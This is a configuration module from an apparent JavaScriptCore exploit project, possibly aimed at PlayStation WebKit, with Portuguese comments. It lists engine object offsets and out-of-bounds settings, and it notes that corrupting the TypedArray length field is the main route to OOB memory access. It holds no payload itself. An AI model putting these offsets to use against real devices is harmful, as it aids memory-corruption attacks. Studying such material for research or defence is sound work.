// js/config.mjs

// Offsets para estruturas do JavaScriptCore (JSC)
// ATENÇÃO: Estes offsets são baseados na análise de arquivos .txt fornecidos
// e podem ser específicos para uma determinada versão/ambiente do JSC (ex: WebKit no PlayStation).
export const JSC_OFFSETS = {
    ArrayBuffer: {
        // Os arquivos .txt (Offset JSObjectGetArrayBufferByteLength.txt) sugerem um modelo
        // onde o JSObject ArrayBuffer (em rax) aponta para uma estrutura interna (rcx = [rax+20h]),
        // e o byteLength está dentro dessa estrutura (byteLength = [rcx+20h]).
        // Manteremos os offsets atuais simplificados, assumindo que foram derivados
        // para o alvo ou como placeholders. A corrupção direta do ArrayBuffer.byteLength
        // exigiria um tratamento mais complexo dessa indireção se ela existir no alvo.
        PTR_INTERNAL_STRUCT_OFFSET: 0x20, // Pode ser ponteiro para Butterfly ou estrutura interna.
        BYTELENGTH_IN_STRUCT_OFFSET: 0x20 // Offset do byteLength dentro da estrutura interna.
    },
    TypedArray: { // JSArrayBufferView
        // Baseado primariamente em JSObjectGetTypedArrayBytesPtr.txt e JSArrayBufferView.txt
        // Um JSArrayBufferView (como Uint32Array) é um JSObject.
        // Os offsets abaixo são relativos ao início do objeto JSArrayBufferView na memória.

        M_VECTOR_OFFSET: 0x10,              // Offset para o ponteiro dos dados brutos (void* m_vector).
                                            // Fonte: JSObjectGetTypedArrayBytesPtr.txt ([rax+10h]).

        M_LENGTH_OFFSET: 0x18,              // Offset para o número de elementos (unsigned m_length).
                                            // Mantido de antes, comum para o contador de elementos.
                                            // Corromper este campo é o objetivo principal para OOB com TypedArrays.

        M_BYTELENGTH_OFFSET_IN_VIEW: 0x20,  // Offset para o tamanho em bytes da view (size_t byteLength).
                                            // Fonte: JSArrayBufferView.txt (0x20 size_t Byte length / byte offset).
                                            // Pode ser útil para verificação.

        M_MODE_OFFSET: 0x28,                // Offset para m_mode (geralmente um uint8_t) que indica o tipo de TypedArray
                                            // (e.g., Uint8Array, Int32Array, Float64Array, etc.).
                                            // Fonte: JSArrayBufferView.txt (0x28 uint8_t Tipo do TypedArray)
                                            // e JSObjectGetTypedArrayBytesPtr.txt ([rbx+28h]).

        ASSOCIATED_ARRAYBUFFER_OFFSET: 0x30 // Offset para o ponteiro do ArrayBuffer de backing (JSArrayBuffer*).
                                            // Fonte: JSObjectGetTypedArrayBytesPtr.txt ([rbx+30h]).
    },
    JSFunction: { // Para exploração mais avançada de funções
        M_EXECUTABLE_OFFSET: 0x18 // Sem novas informações, mantido como estava.
    }
};

// Configurações Padrão do Exploit (podem ser lidas dos inputs do HTML)
export let OOB_CONFIG = {
    ALLOCATION_SIZE: 288,    // Tamanho do oob_array_buffer_real e do victim_object (padrão)
    BASE_OFFSET_IN_DV: 128,  // Offset base dentro do DataView para o início da "janela OOB"
    INITIAL_BUFFER_SIZE: 32  // Tamanho do buffer "antes" da área OOB, usado para calcular offsets relativos
                             // em core_exploit.mjs.
};

export function updateOOBConfigFromUI() {
    const oobAllocSizeEl = document.getElementById('oobAllocSize');
    const baseOffsetEl = document.getElementById('baseOffset');
    const initialBufSizeEl = document.getElementById('initialBufSize');

    let changed = false;
    const currentAllocSize = OOB_CONFIG.ALLOCATION_SIZE;
    const currentBaseOffset = OOB_CONFIG.BASE_OFFSET_IN_DV;
    const currentInitialBufSize = OOB_CONFIG.INITIAL_BUFFER_SIZE;

    if (oobAllocSizeEl) {
        const val = parseInt(oobAllocSizeEl.value, 10);
        if (!isNaN(val) && val > 0) OOB_CONFIG.ALLOCATION_SIZE = val;
    }
    if (baseOffsetEl) {
        const val = parseInt(baseOffsetEl.value, 10);
        if (!isNaN(val) && val >= 0) OOB_CONFIG.BASE_OFFSET_IN_DV = val;
    }
    if (initialBufSizeEl) {
        const val = parseInt(initialBufSizeEl.value, 10);
        if (!isNaN(val) && val >= 0) OOB_CONFIG.INITIAL_BUFFER_SIZE = val;
    }

    if (currentAllocSize !== OOB_CONFIG.ALLOCATION_SIZE ||
        currentBaseOffset !== OOB_CONFIG.BASE_OFFSET_IN_DV ||
        currentInitialBufSize !== OOB_CONFIG.INITIAL_BUFFER_SIZE) {
        changed = true;
    }
    // Loga apenas se houver mudança real e se a função de log estiver disponível
    // import { log } from './utils.mjs'; // Importaria log se fosse usar
    // if (changed && typeof log === 'function') {
    //    log(`Configurações OOB atualizadas da UI: AllocSize=${OOB_CONFIG.ALLOCATION_SIZE}, BaseOffsetDV=${OOB_CONFIG.BASE_OFFSET_IN_DV}, InitialBufSize=${OOB_CONFIG.INITIAL_BUFFER_SIZE}`, "info", "ConfigModule.UIUpdate");
    // }
}

// Inicializa com valores da UI ao carregar o módulo
// updateOOBConfigFromUI(); // Removido para ser chamado explicitamente por app.mjs
